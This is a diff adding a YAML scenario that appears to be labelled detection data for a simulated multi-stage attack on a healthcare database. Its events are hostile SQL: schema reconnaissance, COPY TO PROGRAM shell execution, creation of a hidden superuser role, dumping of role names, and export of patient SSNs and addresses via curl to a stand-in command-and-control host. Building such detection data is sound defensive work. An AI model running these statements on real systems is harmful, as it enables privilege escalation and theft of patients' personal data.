@@ -1,0 +1,49 @@
+scenario_id: healthcare_multi_apt_0013
+family_id: healthcare_multi_apt_0013
+domain: healthcare
+time_of_day: 01:15
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: recon
+  role: nurse
+  class: malicious
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.802418847197766
+  events:
+  - sql: SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'
+  - sql: SELECT column_name FROM information_schema.columns WHERE table_name = 'patients'
+  - step_id: recon_probe
+    sql: COPY (SELECT 'probe') TO PROGRAM 'cat > /dev/null'
+- session_label: escalate
+  role: nurse
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 21.940272142476985
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.4105829354502508
+  events:
+  - step_id: create_shadow
+    sql: CREATE ROLE apt_shadow SUPERUSER LOGIN PASSWORD 'ke1Mo4iCpp'
+  - step_id: dump_creds
+    sql: COPY (SELECT rolname FROM pg_authid) TO PROGRAM 'cat >> /tmp/.cache/roles.txt'
+- session_label: exfil
+  role: research_etl_service
+  class: malicious
+  anchor: db
+  delay_after_previous_seconds: 32.086489180190725
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.036696873329245
+  events:
+  - step_id: exfil
+    sql: COPY (SELECT p.ssn, p.address, p.date_of_birth, p.phone FROM patients p) TO PROGRAM 'curl -sX POST https://c2.example.net/data -d @-'
+    connects_to:
+      ip: 185.220.101.5
+      port: 8443
